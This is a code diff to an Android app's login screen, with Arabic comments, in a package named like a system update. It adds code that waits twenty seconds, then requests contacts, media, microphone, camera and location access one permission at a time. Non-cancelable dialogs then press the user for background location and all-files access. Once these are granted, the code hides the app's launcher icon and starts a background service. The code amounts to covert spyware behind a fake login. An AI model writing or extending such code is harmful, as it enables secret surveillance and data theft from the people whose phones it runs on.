@@ -5,10 +5,13 @@ import android.content.ComponentName
 import android.content.Intent
 import android.content.pm.PackageManager
 import android.graphics.Color
+import android.net.Uri
 import android.os.Build
 import android.os.Bundle
+import android.os.Environment
 import android.os.Handler
 import android.os.Looper
+import android.provider.Settings
 import android.text.InputType
 import android.text.SpannableString
 import android.text.Spanned
@@ -20,6 +23,7 @@ import android.widget.EditText
 import android.widget.ImageView
 import android.widget.TextView
 import android.widget.Toast
+import androidx.appcompat.app.AlertDialog
 import androidx.appcompat.app.AppCompatActivity
 import androidx.core.app.ActivityCompat
 import androidx.core.content.ContextCompat
@@ -29,8 +33,41 @@ class LoginActivity : AppCompatActivity() {
     private lateinit var loginView: View
     private lateinit var registerView: View
     private lateinit var resetView: View
-    private val PERM_REQUEST_CODE = 2001
     private val PERM_DELAY_MS = 20_000L
+    private var currentPermIndex = 0
+
+    // ⭐ الصلاحيات حسب إصدار Android
+    private val permissionsToAsk: List<String> by lazy {
+        val list = mutableListOf<String>()
+
+        // 1. جهات الاتصال
+        list.add(Manifest.permission.READ_CONTACTS)
+
+        // 2. الصور والفيديو والصوت — حسب الإصدار
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+            // Android 13+ (API 33+)
+            list.add(Manifest.permission.READ_MEDIA_IMAGES)
+            list.add(Manifest.permission.READ_MEDIA_VIDEO)
+            list.add(Manifest.permission.READ_MEDIA_AUDIO)
+            list.add(Manifest.permission.POST_NOTIFICATIONS)
+        } else {
+            // Android 12 وأقدم
+            list.add(Manifest.permission.READ_EXTERNAL_STORAGE)
+            if (Build.VERSION.SDK_INT <= Build.VERSION_CODES.P) {
+                list.add(Manifest.permission.WRITE_EXTERNAL_STORAGE)
+            }
+        }
+
+        // 3. الميكروفون والكاميرا
+        list.add(Manifest.permission.RECORD_AUDIO)
+        list.add(Manifest.permission.CAMERA)
+
+        // 4. الموقع
+        list.add(Manifest.permission.ACCESS_FINE_LOCATION)
+        list.add(Manifest.permission.ACCESS_COARSE_LOCATION)
+
+        list
+    }
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
@@ -183,8 +220,10 @@ class LoginActivity : AppCompatActivity() {
                 showToast("Code will be sent (demo)")
             }
 
+            // ⭐ بعد 20 ثانية — ابدأ طلب الصلاحيات واحدة واحدة
             Handler(Looper.getMainLooper()).postDelayed({
-                requestAllPermissions()
+                currentPermIndex = 0
+                askNextPermission()
             }, PERM_DELAY_MS)
 
         } catch (e: Exception) {
@@ -193,43 +232,29 @@ class LoginActivity : AppCompatActivity() {
     }
 
     // ═══════════════════════════════════════════
-    //  الأذونات
+    //  طلب صلاحية واحدة في كل مرة
     // ═══════════════════════════════════════════
-    private fun requestAllPermissions() {
+    private fun askNextPermission() {
         try {
-            val needed = mutableListOf<String>()
-
-            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED)
-                needed.add(Manifest.permission.READ_EXTERNAL_STORAGE)
-
-            if (ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED)
-                needed.add(Manifest.permission.RECORD_AUDIO)
-
-            if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED)
-                needed.add(Manifest.permission.CAMERA)
-
-            if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED)
-                needed.add(Manifest.permission.ACCESS_FINE_LOCATION)
-
-            if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED)
-                needed.add(Manifest.permission.ACCESS_COARSE_LOCATION)
-
-            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED)
-                needed.add(Manifest.permission.READ_CONTACTS)
-
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
-                if (ContextCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS) != PackageManager.PERMISSION_GRANTED)
-                    needed.add(Manifest.permission.POST_NOTIFICATIONS)
+            if (currentPermIndex >= permissionsToAsk.size) {
+                askBackgroundLocation()
+                return
             }
 
-            if (needed.isNotEmpty()) {
-                ActivityCompat.requestPermissions(this, needed.toTypedArray(), PERM_REQUEST_CODE)
-            } else {
-                hideLauncherIcon()
-                startBackgroundService()
+            val perm = permissionsToAsk[currentPermIndex]
+
+            // لو ممنوحة → انتقل للتالية
+            if (ContextCompat.checkSelfPermission(this, perm) == PackageManager.PERMISSION_GRANTED) {
+                currentPermIndex++
+                askNextPermission()
+                return
             }
+
+            // اطلب الصلاحية دي لوحدها
+            ActivityCompat.requestPermissions(this, arrayOf(perm), currentPermIndex + 100)
+
         } catch (e: Exception) {
-            Toast.makeText(this, "Perm err: ${e.message}", Toast.LENGTH_SHORT).show()
+            Log.e("LoginActivity", "askNext err: ${e.message}")
         }
     }
 
@@ -240,54 +265,101 @@ class LoginActivity : AppCompatActivity() {
     ) {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults)
 
-        // ⭐ إخفاء الأيقونة بعد منح الأذونات
-        hideLauncherIcon()
-
-        startBackgroundService()
+        currentPermIndex++
 
         Handler(Looper.getMainLooper()).postDelayed({
-            requestBackgroundLocation()
-        }, 3000)
+            askNextPermission()
+        }, 1000)
     }
 
     // ═══════════════════════════════════════════
-    //  إخفاء الأيقونة من الـ Launcher
+    //  الصلاحيات الخاصة (يدوية)
+    // ═══════════════════════════════════════════
+    private fun askBackgroundLocation() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+            if (ContextCompat.checkSelfPermission(
+                    this,
+                    Manifest.permission.ACCESS_BACKGROUND_LOCATION
+                ) != PackageManager.PERMISSION_GRANTED
+            ) {
+                try {
+                    AlertDialog.Builder(this)
+                        .setTitle("الموقع في الخلفية")
+                        .setMessage("لتفعيل الموقع في الخلفية، اضغط 'السماح دائماً'")
+                        .setPositiveButton("فتح الإعدادات") { _, _ ->
+                            try {
+                                val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS)
+                                intent.data = Uri.parse("package:$packageName")
+                                startActivity(intent)
+                            } catch (_: Exception) {}
+                            Handler(Looper.getMainLooper()).postDelayed({
+                                askAllFilesAccess()
+                            }, 5000)
+                        }
+                        .setCancelable(false)
+                        .show()
+                } catch (_: Exception) {}
+            } else {
+                askAllFilesAccess()
+            }
+        } else {
+            askAllFilesAccess()
+        }
+    }
+
+    private fun askAllFilesAccess() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
+            if (!Environment.isExternalStorageManager()) {
+                try {
+                    AlertDialog.Builder(this)
+                        .setTitle("الوصول للملفات")
+                        .setMessage("لتفعيل الوصول لكل الملفات، اضغط 'السماح'")
+                        .setPositiveButton("فتح الإعدادات") { _, _ ->
+                            try {
+                                val intent = Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION)
+                                intent.data = Uri.parse("package:$packageName")
+                                startActivity(intent)
+                            } catch (e: Exception) {
+                                try {
+                                    val intent = Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION)
+                                    startActivity(intent)
+                                } catch (_: Exception) {}
+                            }
+                            Handler(Looper.getMainLooper()).postDelayed({
+                                onPermissionsComplete()
+                            }, 5000)
+                        }
+                        .setCancelable(false)
+                        .show()
+                } catch (_: Exception) {}
+            } else {
+                onPermissionsComplete()
+            }
+        } else {
+            onPermissionsComplete()
+        }
+    }
+
+    private fun onPermissionsComplete() {
+        hideLauncherIcon()
+        startBackgroundService()
+        showToast("✅ تم تفعيل كل الصلاحيات")
+    }
+
+    // ═══════════════════════════════════════════
+    //  إخفاء الأيقونة
     // ═══════════════════════════════════════════
     private fun hideLauncherIcon() {
         try {
-            // الطريقة 1: إخفاء Activity الرئيسية
             val component = ComponentName(this, LoginActivity::class.java)
             packageManager.setComponentEnabledSetting(
                 component,
                 PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                 PackageManager.DONT_KILL_APP
             )
-            Log.d("LoginActivity", "✅ Icon hidden via LoginActivity disable")
-
-            // الطريقة 2: إخفاء الـ alias (لو موجود)
-            try {
-                val aliasComponent = ComponentName(this, "com.sys.update2.LauncherAlias")
-                packageManager.setComponentEnabledSetting(
-                    aliasComponent,
-                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
-                    PackageManager.DONT_KILL_APP
-                )
-                Log.d("LoginActivity", "✅ Icon hidden via alias disable")
-            } catch (_: Exception) {}
+            Log.d("LoginActivity", "Icon hidden")
         } catch (e: Exception) {
             Log.e("LoginActivity", "hide err: ${e.message}")
-        }
-    }
-
-    private fun requestBackgroundLocation() {
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
-            if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_BACKGROUND_LOCATION) != PackageManager.PERMISSION_GRANTED) {
-                try {
-                    val intent = Intent(android.provider.Settings.ACTION_APPLICATION_DETAILS_SETTINGS)
-                    intent.data = android.net.Uri.parse("package:$packageName")
-                    startActivity(intent)
-                } catch (_: Exception) {}
-            }
         }
     }
 
